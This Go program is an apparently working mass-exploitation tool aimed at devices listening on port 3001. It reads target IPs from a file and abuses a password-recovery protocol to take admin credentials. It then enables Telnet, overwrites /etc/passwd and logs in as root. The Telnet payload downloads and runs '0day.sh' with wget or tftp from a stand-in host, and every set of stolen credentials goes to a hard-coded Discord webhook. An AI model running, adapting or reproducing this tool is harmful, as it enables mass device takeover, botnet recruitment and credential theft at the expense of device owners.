package main

import (
	"bufio"
	"bytes"
	"crypto/des"
	"crypto/md5"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// ---------- DES encode/decode (ports lib/des.py) ----------

func reverseBits(data []byte) []byte {
	out := make([]byte, len(data))
	for i, b := range data {
		v := uint64(b) * 0x0202020202
		v &= 0x010884422010
		out[i] = byte(v % 0x3ff)
	}
	return out
}

func desPad(data []byte) []byte {
	if len(data)%8 != 0 {
		padlen := 8 - (len(data) % 8)
		pad := make([]byte, padlen)
		pad[padlen-1] = byte(padlen)
		data = append(data, pad...)
	}
	return data
}

func desUnpad(data []byte) []byte {
	if len(data) == 0 {
		return data
	}
	padlen := int(data[len(data)-1])
	if padlen > 0 && padlen <= 8 && len(data) >= padlen {
		allZero := true
		for i := len(data) - padlen; i < len(data)-1; i++ {
			if data[i] != 0 {
				allZero = false
				break
			}
		}
		if allZero {
			data = data[:len(data)-padlen]
		}
	}
	return data
}

func desEncryptBlock(block, key []byte) []byte {
	c, err := des.NewCipher(reverseBits(key))
	if err != nil {
		return nil
	}
	padded := desPad(block)
	revIn := reverseBits(padded)
	out := make([]byte, len(revIn))
	for i := 0; i < len(revIn); i += 8 {
		c.Encrypt(out[i:i+8], revIn[i:i+8])
	}
	return reverseBits(out)
}

func desDecryptBlock(data, key []byte) []byte {
	c, err := des.NewCipher(reverseBits(key))
	if err != nil {
		return nil
	}
	revIn := reverseBits(data)
	out := make([]byte, len(revIn))
	for i := 0; i < len(revIn); i += 8 {
		c.Decrypt(out[i:i+8], revIn[i:i+8])
	}
	return desUnpad(reverseBits(out))
}

func desEncode(data, key []byte) string {
	return base64.StdEncoding.EncodeToString(desEncryptBlock(data, key))
}

func desDecode(b64data string, key []byte) []byte {
	raw, err := base64.StdEncoding.DecodeString(b64data)
	if err != nil {
		return nil
	}
	return desDecryptBlock(raw, key)
}

// ---------- td_decrypt (ports lib/crypt.py) ----------

var pat = []byte("abcdefghijklmnopqrstuvwxyz0123456789")

var gword = [][]byte{
	[]byte("SjiW8JO7mH65awR3B4kTZeU90N1szIMrF2PC"),
	[]byte("04A1EF7rCH3fYl9UngKRcObJD6ve8W5jdTta"),
	[]byte("brU5XqY02ZcA3ygE6lf74BIG9LF8PzOHmTaC"),
	[]byte("2I1vF5NMYd0L68aQrp7gTwc4RP9kniJyfuCH"),
	[]byte("136HjBIPWzXCY9VMQa7JRiT4kKv2FGS5s8Lt"),
	[]byte("Hwrhs0Y1Ic3Eq25a6t8Z7TQXVMgdePuxCNzJ"),
	[]byte("WAmkt3RCZM829P4g1hanBluw6eVGSf7E05oX"),
	[]byte("dMxreKZ35tRQg8E02UNTaoI76wGSvVh9Wmc1"),
	[]byte("i20mzKraY74A6qR9QM8H3ecUkBlpJC1nyFSZ"),
	[]byte("XCAUP6H37toQWSgsNanf0j21VKu9T4EqyGd5"),
	[]byte("dFZPb9B6z1TavMUmXQHk7x402oEhKJD58pyG"),
	[]byte("rg8V3snTAX6xjuoCYf519BzWRtcMl2OiZNeI"),
	[]byte("dZe620lr8JW4iFhNj3K1x59Una7PXsLGvSmB"),
	[]byte("5yaQlGSArNzek6MXZ1BPOE3xV470h9KvgYmb"),
	[]byte("f12CVxeQ56YWd7OTXDtlnPqugjJikELayvMs"),
	[]byte("9Qoa5XkM6iIrR7u8tNZgSpbdDUWvwH21Kyzh"),
	[]byte("AqGWke65Y2ufVgljEhMHJL01D8Zptvcw7CxX"),
	[]byte("t960P2inR8qEVmAUsDZIpH5wzSXJ43ob1kGW"),
	[]byte("4l6SAi2KhveRHVN5JGcmx9jOC3afB7wF0ITq"),
	[]byte("tEOp6Xo87QzPbn24J3i9FjWKS1lIBVaMZeHU"),
	[]byte("zx27DH915lhs04aMJOgf6Z3pyERrGndiLwIe"),
	[]byte("8XxOBzZ02hUWDQfvL471q9RC6sAaJVFuTMdG"),
	[]byte("jON0i4C6Z3K97DkbqSypH8lRmx5o2eIwXas1"),
	[]byte("OIGT0ubwH1x6hCvEgBn274A5Q8K9e3YyzWlm"),
	[]byte("zgejY41CLwRNabovBUP2Aql7FVM8uEDXZQ0c"),
	[]byte("Z2MpQE91gdRLYJ8bGIWyOfc4v03Hjzs6VlU5"),
	[]byte("t6PuvrBXeoHk5FJW08DYQSI49GCwZ27cA1UK"),
	[]byte("FiBA53IMW97kYNz82GhHf1yUCdL0nlvRD46s"),
	[]byte("2Vz3b06h54jmc7a8AIYtNHM1iQU9wBXWyJkR"),
	[]byte("wyI42azocV3UOX6fk579hMH8eEGJsgFuBmqb"),
	[]byte("TxmnK4ljJ9iroY8vVtg3Rae2L516fBWUuXAS"),
	[]byte("z6Y1bPrJEln0uWeLKkjo9IZ2y7ROcFHqBm54"),
	[]byte("x064LFB39TsXeryqvt2pZN8QIERuWAVUmwjJ"),
	[]byte("76qg85yB31uH90YbZofsjKrRGiTVndAEtFMx"),
	[]byte("WjwTEbCA752kq89shcaLB1xO64rgMYnoFiJQ"),
	[]byte("u6307O4J2DeZs8UYyjlzfX91KGmavEdwTRSg"),
}

func tdAscToNum(code byte) int {
	if code >= 'A' && code <= 'Z' {
		code += 0x20
	}
	for i, c := range pat {
		if c == code {
			return i
		}
	}
	return -1
}

func tdNumToAsc(code int) byte {
	if code < 36 {
		return pat[code]
	}
	return 0
}

func tdDecrypt(data, key []byte) []byte {
	kdx := 0
	var ret []byte

	for _, code := range data {
		for {
			if kdx >= len(key) {
				kdx = 0
			}
			kcode := key[kdx]
			knum := tdAscToNum(kcode)
			if knum == -1 {
				kdx++
				continue
			}
			row := gword[knum]
			pos := -1
			for j, c := range row {
				if c == code {
					pos = j
					break
				}
			}
			if pos == -1 {
				return nil
			}
			ret = append(ret, tdNumToAsc(pos))
			kdx++
			break
		}
	}
	return ret
}

// ---------- Binary protocol (ports lib/binproto.py) ----------

func recvAll(conn net.Conn, length int) ([]byte, error) {
	buf := make([]byte, length)
	_, err := io.ReadFull(conn, buf)
	return buf, err
}

type Channel struct {
	ip       string
	ipBytes  [4]byte
	port     int
	msgSeq   uint16
	dataSeq  uint32
	conn     net.Conn
	msgQueue [][]string
}

func NewChannel(ip string, port int) *Channel {
	ch := &Channel{
		ip:   ip,
		port: port,
	}
	parsed := net.ParseIP(ip).To4()
	if parsed != nil {
		ch.ipBytes = [4]byte{parsed[3], parsed[2], parsed[1], parsed[0]}
	}
	return ch
}

// Quick port check with short timeout
func portOpen(host string, port int, timeout time.Duration) bool {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", host, port), timeout)
	if err != nil {
		return false
	}
	conn.Close()
	return true
}

func (ch *Channel) Connect() error {
	var err error
	ch.conn, err = net.DialTimeout("tcp", fmt.Sprintf("%s:%d", ch.ip, ch.port), 5*time.Second) // reduced from 10s
	if err != nil {
		return err
	}
	ch.conn.SetDeadline(time.Now().Add(30 * time.Second))
	return nil
}

func (ch *Channel) Reconnect() error {
	if ch.conn != nil {
		ch.conn.Close()
	}
	return ch.Connect()
}

func (ch *Channel) Close() {
	if ch.conn != nil {
		ch.conn.Close()
	}
}

func (ch *Channel) SendCmd(data []byte) error {
	hdr := make([]byte, 20)
	hdr[0] = 0xf1
	hdr[1] = 0xf5
	hdr[2] = 0xea
	hdr[3] = 0xf5
	binary.LittleEndian.PutUint16(hdr[4:6], ch.msgSeq)
	binary.LittleEndian.PutUint16(hdr[6:8], uint16(len(data)+20))
	binary.LittleEndian.PutUint32(hdr[16:20], uint32(len(data)))
	_, err := ch.conn.Write(append(hdr, data...))
	ch.msgSeq++
	return err
}

func (ch *Channel) SendData(streamType uint32, data []byte) error {
	hdr := make([]byte, 20)
	hdr[0] = 0xf1
	hdr[1] = 0xf5
	hdr[2] = 0xea
	hdr[3] = 0xf9
	binary.LittleEndian.PutUint32(hdr[4:8], ch.dataSeq)
	copy(hdr[8:12], ch.ipBytes[:])
	binary.LittleEndian.PutUint16(hdr[12:14], 0)
	binary.LittleEndian.PutUint16(hdr[14:16], uint16(len(data)+20))
	binary.LittleEndian.PutUint32(hdr[16:20], streamType)
	_, err := ch.conn.Write(append(hdr, data...))
	ch.dataSeq++
	return err
}

type RecvResult struct {
	Msgs       [][]string
	StreamType uint32
	StreamData []byte
}

func (ch *Channel) Recv() (*RecvResult, error) {
	hdr, err := recvAll(ch.conn, 20)
	if err != nil {
		return nil, err
	}

	magic := hdr[:4]

	if magic[0] == 0xf1 && magic[1] == 0xf5 && magic[2] == 0xea && magic[3] == 0xf9 {
		lsize := binary.LittleEndian.Uint16(hdr[14:16])
		streamType := binary.LittleEndian.Uint32(hdr[16:20])
		data, err := recvAll(ch.conn, int(lsize)-20)
		if err != nil {
			return nil, err
		}
		return &RecvResult{StreamType: streamType, StreamData: data}, nil
	} else if magic[0] == 0xf1 && magic[1] == 0xf5 && magic[2] == 0xea && magic[3] == 0xf5 {
		lsize := binary.LittleEndian.Uint16(hdr[6:8])
		dsize := lsize - 20
		data, err := recvAll(ch.conn, int(dsize))
		if err != nil {
			return nil, err
		}
		rawStr := strings.TrimSpace(string(data))
		parts := strings.Split(rawStr, "\n\n\n")
		var msgs [][]string
		for _, part := range parts {
			msg := strings.Split(part, "\t")
			if len(msg) > 0 && !strings.Contains(msg[0], ".") {
				msg = append([]string{ch.ip}, msg...)
			}
			msgs = append(msgs, msg)
		}
		return &RecvResult{Msgs: msgs}, nil
	}
	return nil, fmt.Errorf("invalid packet magic: %x", magic)
}

func (ch *Channel) RecvMsg() ([]string, error) {
	if len(ch.msgQueue) > 0 {
		ret := ch.msgQueue[0]
		ch.msgQueue = ch.msgQueue[1:]
		return ret, nil
	}
	res, err := ch.Recv()
	if err != nil {
		return nil, err
	}
	if res.Msgs == nil {
		return nil, fmt.Errorf("expected msg, got data")
	}
	if len(res.Msgs) > 1 {
		ch.msgQueue = append(ch.msgQueue, res.Msgs[1:]...)
	}
	return res.Msgs[0], nil
}

func (ch *Channel) SendMsg(msg []string) error {
	payload := ch.ip + "\t" + strings.Join(msg, "\t") + "\n\n\n"
	return ch.SendCmd([]byte(payload))
}

func (ch *Channel) GetCryptKey(mode int) ([]byte, error) {
	uname := base64.StdEncoding.EncodeToString([]byte("Admin"))
	pw := base64.StdEncoding.EncodeToString([]byte("Admin"))

	err := ch.SendMsg([]string{"IP", "USER", "LOGON", uname, pw, "", strconv.Itoa(mode), "UTF-8", "805306367", "1"})
	if err != nil {
		return nil, err
	}

	resp, err := ch.RecvMsg()
	if err != nil {
		return nil, err
	}

	if len(resp) < 9 || resp[4] != "LOGONFAILED" || resp[5] != "3" {
		return nil, fmt.Errorf("unrecognized login response: %v", resp)
	}

	cryptKey, err := base64.StdEncoding.DecodeString(resp[8])
	if err != nil {
		return nil, err
	}
	return cryptKey, nil
}

func (ch *Channel) LoginWithKey(uname, pw, cryptKey []byte) (bool, error) {
	err := ch.Reconnect()
	if err != nil {
		return false, err
	}

	loweredUname := make([]byte, len(uname))
	for i, b := range uname {
		if b >= 'A' && b <= 'Z' {
			loweredUname[i] = b + 0x20
		} else {
			loweredUname[i] = b
		}
	}

	h1 := md5.Sum(append(loweredUname, cryptKey...))
	hashedUname := base64.StdEncoding.EncodeToString(h1[:])
	h2 := md5.Sum(append(pw, cryptKey...))
	hashedPw := base64.StdEncoding.EncodeToString(h2[:])

	err = ch.SendMsg([]string{"IP", "USER", "LOGON", hashedUname, hashedPw, "", "1", "UTF-8", "1", "1"})
	if err != nil {
		return false, err
	}

	resp, err := ch.RecvMsg()
	if err != nil {
		return false, err
	}

	if len(resp) > 4 && resp[4] == "LOGONFAILED" {
		return false, nil
	}

	ch.msgQueue = append([][]string{resp}, ch.msgQueue...)
	return true, nil
}

func (ch *Channel) Login(uname, pw []byte) ([]byte, error) {
	cryptKey, err := ch.GetCryptKey(1)
	if err != nil {
		return nil, err
	}
	ok, err := ch.LoginWithKey(uname, pw, cryptKey)
	if err != nil {
		return nil, err
	}
	if !ok {
		return nil, nil
	}
	return cryptKey, nil
}

// ---------- Discord Webhook ----------

const webhookURL = "https://discord.com/api/webhooks/1533697437787492392/RiafIoeRtGGR-05c1QFf9HX60sl1J0aO3cpNNhlQX-Q3p7CD0cwLqBGOboGooj85N1WN"

func sendWebhook(host, user, pass, banner string) {
	content := fmt.Sprintf("**Success on %s**\nUser: %s\nPass: %s\nBanner: ```%s```", host, user, pass, banner)
	payload := map[string]string{"content": content}
	jsonData, _ := json.Marshal(payload)
	http.Post(webhookURL, "application/json", bytes.NewBuffer(jsonData))
}

// ---------- Main logic ----------

func trySetMail(conn *Channel, target string) bool {
	err := conn.SendMsg([]string{"PROXY", "USER", "RESERVEPHONE", "2", "1", target, "FILETRANSPORT"})
	if err != nil {
		return false
	}
	resp, err := conn.RecvMsg()
	if err != nil {
		return false
	}
	return len(resp) >= 7 && resp[4] == "RESERVEPHONE" && resp[5] == "2" && resp[6] == "1"
}

func getPswCode(conn *Channel) (string, bool, error) {
	uname := base64.StdEncoding.EncodeToString([]byte("Admin"))
	pw := base64.StdEncoding.EncodeToString([]byte("Admin"))

	err := conn.SendMsg([]string{"IP", "USER", "LOGON", uname, pw, "", "65536", "UTF-8", "0", "1"})
	if err != nil {
		return "", false, err
	}

	resp, err := conn.RecvMsg()
	if err != nil {
		return "", false, err
	}

	if len(resp) < 5 || resp[4] != "FINDPSW" {
		return "", false, fmt.Errorf("not FINDPSW")
	}

	var pswReg, pswData string
	if len(resp) > 7 {
		pswReg = resp[6]
		pswData = resp[7]
	}

	if pswData == "" {
		return "", true, nil
	}

	if len(resp) < 6 {
		return "", false, fmt.Errorf("bad response")
	}
	pswType, err := strconv.Atoi(resp[5])
	if err != nil {
		return "", false, err
	}

	if pswType != 1 && pswType != 2 && pswType != 3 {
		return "", false, fmt.Errorf("unsupported psw type: %d", pswType)
	}

	var pswKey string
	if pswType == 3 {
		parts := strings.Split(pswData, "\"")
		if len(parts) > 3 {
			pswData = parts[3]
		}
	}
	if pswType == 1 {
		colonParts := strings.SplitN(pswData, ":", 2)
		if len(colonParts) > 1 {
			pswData = colonParts[1]
		}
		if len(pswReg) >= 0x1f {
			pswKey = pswReg[:0x1f]
		} else {
			pswKey = pswReg
		}
	} else { // 2 or 3
		if len(pswReg) >= 4 {
			pswKey = strings.ToLower(pswReg[:4])
		} else {
			pswKey = strings.ToLower(pswReg)
		}
	}

	pswCode := tdDecrypt([]byte(pswData), []byte(pswKey))
	if pswCode == nil {
		return "", true, nil
	}

	h := md5.Sum(pswCode)
	code := fmt.Sprintf("%x", h)[24:]
	return code, true, nil
}

func recoverWithCode(conn *Channel, code string, cryptKey []byte) (int, string) {
	err := conn.SendMsg([]string{"IP", "USER", "SECURITYCODE", code, "FILETRANSPORT"})
	if err != nil {
		return -1, ""
	}
	resp, err := conn.RecvMsg()
	if err != nil {
		return -1, ""
	}
	if len(resp) < 7 {
		return -1, ""
	}
	rcode, err := strconv.Atoi(resp[6])
	if err != nil {
		return -1, ""
	}
	if rcode == 0 && len(resp) > 8 {
		pw := desDecode(resp[8], cryptKey)
		if pw != nil {
			return 0, string(pw)
		}
	}
	return rcode, ""
}

func recoverWithDefault(conn *Channel, cryptKey []byte) (string, string, bool) {
	ok, err := conn.LoginWithKey([]byte("Default"), []byte("Default"), cryptKey)
	if err != nil || !ok {
		return "", "", false
	}
	for {
		msg, err := conn.RecvMsg()
		if err != nil {
			return "", "", false
		}
		if len(msg) >= 8 && msg[1] == "IP" && msg[2] == "INNER" && msg[3] == "SUPER" && msg[4] == "GETUSERINFO" {
			u := desDecode(msg[6], cryptKey)
			p := desDecode(msg[7], cryptKey)
			if u != nil && p != nil {
				return string(u), string(p), true
			}
			return "", "", false
		}
	}
}

func recover_(host string) (string, string, bool) {
	fmt.Fprintf(os.Stderr, "[%s] Starting recovery\n", host)
	conn := NewChannel(host, 3001)
	if err := conn.Connect(); err != nil {
		fmt.Fprintf(os.Stderr, "[%s] Connect failed: %v\n", host, err)
		return "", "", false
	}
	defer conn.Close()

	cryptKey, err := conn.GetCryptKey(65536)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[%s] GetCryptKey failed: %v\n", host, err)
		return "", "", false
	}

	attempts := 2
	triedToSetMail := false
	var credUser, credPass string
	ok := false

	for attempts > 0 {
		attempts--
		code, wasFound, err := getPswCode(conn)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[%s] getPswCode error: %v\n", host, err)
			break
		}
		if code == "" && wasFound {
			fmt.Fprintf(os.Stderr, "[%s] Code empty, trying to set mail\n", host)
			if !triedToSetMail {
				triedToSetMail = true
				if trySetMail(conn, "a@a.a") {
					code, wasFound, err = getPswCode(conn)
					if err != nil || (code == "" && wasFound) {
						// still None after setting mail
					}
				}
			}
		}
		if code == "" {
			fmt.Fprintf(os.Stderr, "[%s] No code obtained\n", host)
			break
		}

		fmt.Fprintf(os.Stderr, "[%s] Got code: %s\n", host, code)
		rcode, password := recoverWithCode(conn, code, cryptKey)
		if rcode == 5 {
			fmt.Fprintf(os.Stderr, "[%s] recoverWithCode returned rcode=5 (blocked)\n", host)
			break
		}
		if rcode == 0 {
			credUser = "Admin"
			credPass = password
			ok = true
			fmt.Fprintf(os.Stderr, "[%s] Recovered password: %s\n", host, credPass)
			break
		}
	}

	if triedToSetMail {
		trySetMail(conn, "")
	}

	if !ok {
		fmt.Fprintf(os.Stderr, "[%s] Trying Default/Default fallback\n", host)
		user, pw, found := recoverWithDefault(conn, cryptKey)
		if found {
			credUser = user
			credPass = pw
			ok = true
			fmt.Fprintf(os.Stderr, "[%s] Fallback credentials: %s:%s\n", host, user, pw)
		}
	}

	if ok {
		return credUser, credPass, true
	}
	return "", "", false
}

func enableTelnet(host, user, pass string) error {
	fmt.Fprintf(os.Stderr, "[%s] Enabling Telnet...\n", host)
	main_ := NewChannel(host, 3001)
	if err := main_.Connect(); err != nil {
		return err
	}
	defer main_.Close()

	cryptKey, err := main_.Login([]byte(user), []byte(pass))
	if err != nil || cryptKey == nil {
		return fmt.Errorf("login failed")
	}

	variants := [][]string{
		{"PROXY", "PARASET", "COMMONENABLE", "73748", "0", "1"},
		{"PROXY", "PARASET", "COMMONENABLE", "73748", "1", "0"},
		{"PROXY", "PARASET", "COMMONENABLE", "73748", "1", "1"},
	}
	for _, v := range variants {
		err = main_.SendMsg(v)
		if err == nil {
			time.Sleep(2 * time.Second)
			if _, err := net.DialTimeout("tcp", host+":23", 2*time.Second); err == nil {
				fmt.Fprintf(os.Stderr, "[%s] Telnet enabled (command %v)\n", host, v)
				return nil
			}
		}
	}
	return fmt.Errorf("could not enable telnet")
}

func setPasswd(host, user, pass string) error {
	fmt.Fprintf(os.Stderr, "[%s] Uploading passwd...\n", host)
	main_ := NewChannel(host, 3001)
	if err := main_.Connect(); err != nil {
		return err
	}

	cryptKey, err := main_.Login([]byte(user), []byte(pass))
	if err != nil || cryptKey == nil {
		main_.Close()
		return fmt.Errorf("login failed")
	}

	var cmdID int
	for {
		msg, err := main_.RecvMsg()
		if err != nil {
			main_.Close()
			return err
		}
		if len(msg) > 4 && msg[3] == "CMDID" {
			cmdID, _ = strconv.Atoi(msg[4])
			break
		}
		if len(msg) > 3 && msg[2] == "CMDID" {
			cmdID, _ = strconv.Atoi(msg[3])
			break
		}
	}
	fmt.Fprintf(os.Stderr, "[%s] CMDID = %d\n", host, cmdID)

	stopKeepAlive := make(chan struct{})
	go func() {
		ticker := time.NewTicker(5 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-stopKeepAlive:
				return
			case <-ticker.C:
				main_.SendMsg([]string{})
			}
		}
	}()

	go func() {
		for {
			select {
			case <-stopKeepAlive:
				return
			default:
				main_.conn.SetReadDeadline(time.Now().Add(1 * time.Second))
				main_.Recv()
			}
		}
	}()

	defer func() {
		close(stopKeepAlive)
		main_.Close()
	}()

	data, err := os.ReadFile("passwd.txt")
	if err != nil {
		return fmt.Errorf("cannot read passwd.txt: %v", err)
	}
	dataSize := len(data)
	var cksum int
	for _, b := range data {
		cksum += int(b)
	}

	fname := "/etc/passwd"

	tx := NewChannel(host, 3001)
	if err := tx.Connect(); err != nil {
		return err
	}
	defer tx.Close()

	err = tx.SendMsg([]string{"IP", "CMD", "FILETRANSPORT", strconv.Itoa(cmdID), "0", strconv.Itoa(dataSize), strconv.Itoa(cksum), "0", fname, "0"})
	if err != nil {
		return err
	}

	resp, err := tx.RecvMsg()
	if err != nil {
		return err
	}
	if len(resp) < 6 || resp[4] != "FILETRANSPORT" || resp[5] != "0" {
		return fmt.Errorf("file transport rejected: %v", resp)
	}

	for offset := 0; offset < dataSize; offset += 1000 {
		end := offset + 1000
		if end > dataSize {
			end = dataSize
		}
		if err := tx.SendData(0, data[offset:end]); err != nil {
			return err
		}
	}
	tx.RecvMsg()
	fmt.Fprintf(os.Stderr, "[%s] passwd uploaded\n", host)
	return nil
}

func runCmd(host string) (string, error) {
	fmt.Fprintf(os.Stderr, "[%s] Running Telnet payload...\n", host)
	conn, err := net.DialTimeout("tcp", host+":23", 10*time.Second)
	if err != nil {
		return "", err
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(60 * time.Second))

	buf := make([]byte, 4096)
	n, err := conn.Read(buf)
	if err != nil {
		return "", err
	}
	banner := string(buf[:n])

	if !strings.Contains(banner, "login:") {
		time.Sleep(1 * time.Second)
		n, _ = conn.Read(buf)
		banner += string(buf[:n])
	}
	conn.Write([]byte("root\r\n"))

	time.Sleep(1 * time.Second)
	conn.Read(buf) // consume echo
	conn.Write([]byte("cheems69\r\n"))

	time.Sleep(2 * time.Second)
	conn.Read(buf)

	payload := "sh -c \"cd /tmp || cd /run || cd /var/tmp || cd /; wget -q http://urIP/0day.sh -O /tmp/0day.sh; chmod 777 /tmp/0day.sh; sh /tmp/0day.sh; /tmp/0day.sh; tftp -g -r 0day.sh urIP -l /tmp/0day.sh; chmod 777 /tmp/0day.sh; sh /tmp/0day.sh; /tmp/0day.sh; rm -f /tmp/0day.sh\"\r\n"
	conn.Write([]byte(payload))

	time.Sleep(35 * time.Second)
	var output strings.Builder
	for i := 0; i < 5; i++ {
		n, _ := conn.Read(buf)
		if n > 0 {
			output.Write(buf[:n])
		}
	}
	return banner, nil
}

func runHost(host string) {
	defer func() {
		if r := recover(); r != nil {
			fmt.Fprintf(os.Stderr, "[%s] Panic: %v\n", host, r)
		}
	}()

	// Quick port check before attempting full connection (skip if not open)
	if !portOpen(host, 3001, 2*time.Second) {
		fmt.Fprintf(os.Stderr, "[%s] Port 3001 not reachable, skipping\n", host)
		return
	}

	user, pass, ok := recover_(host)
	if !ok {
		fmt.Fprintf(os.Stderr, "[%s] Failed to recover credentials\n", host)
		return
	}

	if err := enableTelnet(host, user, pass); err != nil {
		fmt.Fprintf(os.Stderr, "[%s] enableTelnet error: %v\n", host, err)
		return
	}

	if err := setPasswd(host, user, pass); err != nil {
		fmt.Fprintf(os.Stderr, "[%s] setPasswd error: %v\n", host, err)
		return
	}

	time.Sleep(2 * time.Second)
	banner, err := runCmd(host)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[%s] runCmd error: %v\n", host, err)
		return
	}

	fmt.Fprintf(os.Stderr, "[%s] SUCCESS! Sending to Discord...\n", host)
	sendWebhook(host, user, pass, banner)
}

func main() {
	workers := 200 // increased default
	if len(os.Args) > 1 {
		if w, err := strconv.Atoi(os.Args[1]); err == nil && w > 0 {
			workers = w
		}
	}

	file, err := os.Open("ips.txt")
	if err != nil {
		fmt.Fprintf(os.Stderr, "Cannot open ips.txt: %v\n", err)
		os.Exit(1)
	}
	defer file.Close()

	var ips []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			ips = append(ips, line)
		}
	}

	total := int64(len(ips))
	var done int64

	fmt.Fprintf(os.Stderr, "[*] Loaded %d IPs, using %d goroutines\n", total, workers)

	jobs := make(chan string, workers*4)
	var wg sync.WaitGroup

	go func() {
		for {
			d := atomic.LoadInt64(&done)
			fmt.Fprintf(os.Stderr, "\r[%d/%d]", d, total)
			if d >= total {
				fmt.Fprintln(os.Stderr)
				return
			}
			time.Sleep(500 * time.Millisecond)
		}
	}()

	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for host := range jobs {
				runHost(host)
				atomic.AddInt64(&done, 1)
			}
		}()
	}

	for _, ip := range ips {
		jobs <- ip
	}
	close(jobs)

	wg.Wait()
	atomic.StoreInt64(&done, total)
	time.Sleep(600 * time.Millisecond)
	fmt.Fprintf(os.Stderr, "[*] Done\n")
}
